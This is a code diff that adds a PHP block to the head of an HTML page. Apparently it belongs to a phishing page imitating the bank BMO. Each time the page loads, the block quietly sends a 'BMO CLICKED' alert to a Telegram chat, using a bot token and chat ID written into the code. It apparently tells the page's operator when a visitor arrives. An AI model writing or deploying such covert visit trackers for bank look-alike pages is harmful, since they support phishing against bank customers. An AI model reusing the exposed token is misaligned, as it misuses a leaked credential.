@@ -1,4 +1,20 @@
+<?php
 
+
+$message ="BMO CLICKED\n";
+
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$data = [
+    'chat_id' => '-1001831940786',
+    'text' => $message
+];
+
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
+                                 http_build_query($data) );
+                                                    
+
+?>
+   
 <html lang="en">
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
